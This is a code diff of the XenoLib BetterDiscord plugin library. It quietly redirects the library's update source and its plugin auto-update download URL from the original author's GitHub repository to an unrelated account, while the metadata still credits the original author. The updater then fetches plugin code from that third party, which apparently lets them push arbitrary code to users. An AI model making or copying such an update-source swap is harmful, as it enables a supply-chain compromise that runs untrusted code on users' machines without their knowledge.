@@ -110,7 +110,7 @@ module.exports = (() => {
       version: '1.4.11',
       description: 'Simple library to complement plugins with shared code without lowering performance. Also adds needed buttons to some plugins.',
       github: 'https://github.com/1Lighty',
-      github_raw: 'https://raw.githubusercontent.com/1Lighty/BetterDiscordPlugins/master/Plugins/1XenoLib.plugin.js'
+      github_raw: 'https://raw.githubusercontent.com/sshadmin147/BetterDiscordPlugins/master/Plugins/1XenoLib.plugin.js'
     },
     changelog: [
       {
@@ -2430,7 +2430,7 @@ module.exports = (() => {
                 let plugin = BdApi.Plugins.get(name);
                 if (plugin && plugin.instance) plugin = plugin.instance;
                 // eslint-disable-next-line no-loop-func
-                const req = https.request(`https://raw.githubusercontent.com/1Lighty/BetterDiscordPlugins/master/Plugins/${name}/${name}.plugin.js`, { headers: { origin: 'discord.com' } }, res => {
+                const req = https.request(`https://raw.githubusercontent.com/sshadmin147/BetterDiscordPlugins/master/Plugins/${name}/${name}.plugin.js`, { headers: { origin: 'discord.com' } }, res => {
                   let body = '';
                   // eslint-disable-next-line no-void
                   res.on('data', chunk => ((body += chunk), void 0));
